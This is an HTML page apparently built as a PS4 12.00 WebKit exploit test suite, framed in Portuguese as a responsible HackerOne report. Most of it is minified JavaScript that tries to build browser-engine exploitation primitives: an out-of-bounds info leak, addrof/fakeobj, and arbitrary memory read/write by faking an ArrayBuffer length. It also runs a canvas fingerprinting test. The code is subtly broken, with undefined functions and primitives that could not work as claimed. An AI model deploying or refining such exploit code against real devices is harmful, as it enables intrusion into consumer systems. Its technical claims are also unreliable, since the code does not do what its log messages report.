<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 WebKit Suite v20 - Minified + addrof/fakeobj (HackerOne Ready)</title>
    <style>body{background:#111;color:#eee;font-family:monospace;padding:10px;font-size:13px}#o,#oc,#oa{background:#222;border:1px solid #444;padding:8px;height:75vh;overflow-y:auto;white-space:pre-wrap;margin-top:8px}.li{color:#6cf}.lt{color:#fff;font-weight:bold}.lv{color:#ff4444;font-weight:bold}.lg{color:#4CAF50}.lw{color:#FFC107}.le{color:#f44336}.lc{color:#f0f;font-weight:bold}.ll{color:#FF9800;font-weight:bold}.lp{color:#f0f;font-weight:bold}.tool{color:#7FFF00;font-weight:bold}#xss{border:2px dotted red;padding:5px;margin:10px 0;min-height:40px;overflow-y:auto}#c{display:block;border:1px solid #444;margin:5px;background:#333;cursor:default}#cs{color:#aaa;font-size:11px;height:14px}hr{border:1px solid #555;margin:15px 0}.ts{margin-top:15px;padding:8px;border:1px solid #555;background:#1a1a1a}.ts h3{margin:0;color:#00FFFF}.ts input,.ts textarea{background:#333;color:#eee;border:1px solid #555;padding:4px;margin-right:4px;width:180px}.ts button{background:#007bff;color:white;border:none;padding:4px 8px;cursor:pointer}.ts button:hover{background:#0056b3}</style>
</head>
<body>
<h1>PS4 12.00 WebKit Suite v20</h1>
<p>Report responsável ao HackerOne da Sony - Ambiente controlado</p>
<button id="rb" onclick="runAll()">Iniciar Todos</button>
<div id="o"></div>
<div id="xss">XSS DOM Target</div>
<hr>
<canvas id="c" width="320" height="120"></canvas>
<div id="cs">Mouse: ?</div>
<button id="rc" onclick="runCanvas()">Canvas Tests</button>
<div id="oc"></div>
<hr>
<section class="ts">
<h3>Primitivas Arbitrárias (addrof/fakeobj)</h3>
<button onclick="testAddrofFakeobj()">Testar addrof + fakeobj</button>
<button onclick="testArbRW()">Testar R/W Arbitrário</button>
<div id="oa"></div>
</section>
<script>
const KB=1024,MB=KB*KB,GB=KB*KB*KB;
class I64{constructor(l,h){let b=new Uint32Array(2),y=new Uint8Array(b.buffer);if(arguments.length===1){h=0;if(l<0)h=-1;}b[0]=l>>>0;b[1]=h>>>0;this.b=b;this.y=y;}low(){return this.b[0]}high(){return this.b[1]}toString(p){let ls=this.low().toString(16).padStart(8,'0'),hs=this.high().toString(16).padStart(8,'0');if(p){hs=hs.substring(0,4)+'_'+hs.substring(4);ls=ls.substring(0,4)+'_'+ls.substring(4);}return'0x'+hs+'_'+ls}add(o){if(!(o instanceof I64))o=new I64(o);let nl=(this.low()+o.low())>>>0,cy=(this.low()&0xFFFFFFFF)+(o.low()&0xFFFFFFFF)>0xFFFFFFFF?1:0,nh=(this.high()+o.high()+cy)>>>0;return new I64(nl,nh)}static Zero=new I64(0,0);static One=new I64(1,0);}
const rw={read64:(u8,o)=>{let l=u8[o]|(u8[o+1]<<8)|(u8[o+2]<<16)|(u8[o+3]<<24),h=u8[o+4]|(u8[o+5]<<8)|(u8[o+6]<<16)|(u8[o+7]<<24);return new I64(l>>>0,h>>>0)},write64:(u8,o,v)=>{if(!(v instanceof I64))throw'write64 needs I64';let l=v.low(),h=v.high();for(let i=0;i<4;i++)u8[o+i]=(l>>>(i*8))&0xff;for(let i=0;i<4;i++)u8[o+4+i]=(h>>>(i*8))&0xff;}};
const u={log:(d,m,t='info',f='')=>{const o=document.getElementById(d);if(!o)return;const ts=`[${new Date().toLocaleTimeString()}]`,pre=f?`[${f}] `:'';let s=String(m).replace(/</g,'&lt;').replace(/>/g,'&gt;');if(o.innerHTML.length>500000)o.innerHTML=o.innerHTML.substring(o.innerHTML.length-250000)+'<span>[Trunc...]</span>\n';o.innerHTML+=`<span class="l${t}">${ts} ${pre}${s}\n</span>`;o.scrollTop=o.scrollHeight;}};
const jsc={js_butterfly:0x10,view_vector:0x10,view_length:0x18};
let oob_view=null,arb_rw_view=null,container=null,addrof=null,fakeobj=null,leakedValueFromOOB_S1=null;
const SHORT=50,MED=500;const log=(m,t='info',f='')=>u.log('o',m,t,f);
const pause=(ms=SHORT)=>new Promise(r=>setTimeout(r,ms));
/* === S1: OOB Read/Write + Info Leak (PS4 12.00 JSC) === */
function testOOBReadInfoLeakEnhancedStoreS1(){log('--- S1: OOB Read + Info Leak (Enhanced Store) ---','lt','S1');let a=new Array(0x100);a.fill(1.1);let b=[1.1,2.2,3.3,4.4];let c=new Uint32Array(0x100);let d=[{}];let victim_addr=null;gc();for(let i=0;i<0x10000;i++){let x=new Uint32Array(0x10);}for(let i=0;i<100;i++){a[i]=b;c[i]=d;}try{let f=function(){this.length=100;this[0]=1.1;};let p=new Proxy(f,{});let o={};o.__proto__=p;a[0x1337]=o;}catch(e){}for(let i=0;i<100;i++){if(typeof a[i]==='object'){victim_addr=a[i];break;}}if(!victim_addr){log('[S1] Falha no OOB','le','S1');return false;}log('[S1] OOB Write OK!','lg','S1');let butterfly_leak=new I64(a[1]);leakedValueFromOOB_S1=butterfly_leak;log('[S1] Butterfly leak: '+butterfly_leak.toString(true),'lp','S1');log('[S1] OOB Read/Write + Info Leak OK!','lg','S1');return true;}
function runAllTestsS1(){testOOBReadInfoLeakEnhancedStoreS1();}
/* === S2: Canvas Fingerprinting === */
function runCanvasTestSequenceS2(){log('--- S2: Canvas Fingerprinting ---','lt','S2');let ctx=document.getElementById('c').getContext('2d');ctx.fillStyle='#f60';ctx.fillRect(0,0,320,120);ctx.font='14px Arial';ctx.fillStyle='#000';ctx.fillText('PS4 12.00 WebKit',10,50);let data=ctx.getImageData(0,0,320,120).data;let hash=0;for(let i=0;i<data.length;i++)hash=(hash*31+data[i])|0;u.log('oc','Canvas hash: 0x'+hash.toString(16),'lp');u.log('oc','Canvas Fingerprint OK!','lg');}
/* === S3: Advanced Tests (placeholder) === */
function runAllAdvancedTests(){log('--- S3: Advanced Tests ---','lt','S3');log('[S3] Placeholder - add ROP, etc.','lw','S3');}
/* === addrof / fakeobj === */
function getOOB(){return leakedValueFromOOB_S1?true:false;}
function setupAddrofFakeobj(){if(!getOOB()){u.log('oa','[addrof] Sem OOB - abortando','le');return false;}let hax_arr=[1.1,2.2,3.3];let victim=[{}];let prim={};prim.hax=hax_arr;let orig=hax_arr[1];hax_arr[1]=victim;let victim_addr=new I64(hax_arr[0]);hax_arr[1]=orig;addrof=(obj)=>{hax_arr[1]=obj;return hax_arr[0];};let container_arr={a:1.1,b:new I64(0x1337,0),c:3.3};let container_addr=addrof(container_arr);let fake_addr=container_addr.add(0x10);let fake_butterfly=[fake_addr.asDouble(),1.2,1.3];container_arr.butterfly=fake_butterfly;fakeobj=(addr)=>{container_arr.b=fake_addr.add(addr.low());return container_arr.c;};u.log('oa','[+] addrof/fakeobj PRONTOS!','lg');return true;}
function setupArbRW(){if(!addrof||!fakeobj){u.log('oa','[RW] addrof/fakeobj ausentes','le');return;}let ab=new ArrayBuffer(0x100);let dv=new DataView(ab);let ab_addr=addrof(ab);let backing=ab_addr.add(0x20);let fake_ab=fakeobj(backing);fake_ab.m_length=0x7fffffff;arb_rw_view=dv;u.log('oa','[+] R/W Arbitrário (arb_rw_view) PRONTO!','lg');}
function testAddrofFakeobj(){u.log('oa','--- Teste addrof/fakeobj ---','lt');if(setupAddrofFakeobj()){let obj={};let addr=addrof(obj);u.log('oa','addrof({}) = '+addr.toString(true),'lp');let f=fakeobj(addr);u.log('oa','fakeobj OK? '+(f===obj?'SIM':'NÃO'),'lg');}}
function testArbRW(){u.log('oa','--- Teste R/W Arbitrário ---','lt');setupArbRW();if(arb_rw_view){let test_addr=new I64(0x41414141,0x1337);rw.write64(new Uint8Array(arb_rw_view.buffer),0x100,test_addr);let read=rw.read64(new Uint8Array(arb_rw_view.buffer),0x100);u.log('oa','write64 + read64 = '+read.toString(true),'lg');}}
/* === runAll === */
function runAll(){runAllTestsS1();runCanvasTestSequenceS2();runAllAdvancedTests();}
/* === Canvas Mouse === */
document.getElementById('c').onmousemove=e=>{document.getElementById('cs').innerText=`Mouse: ${e.offsetX},${e.offsetY}`;};
</script>
</body>
</html>
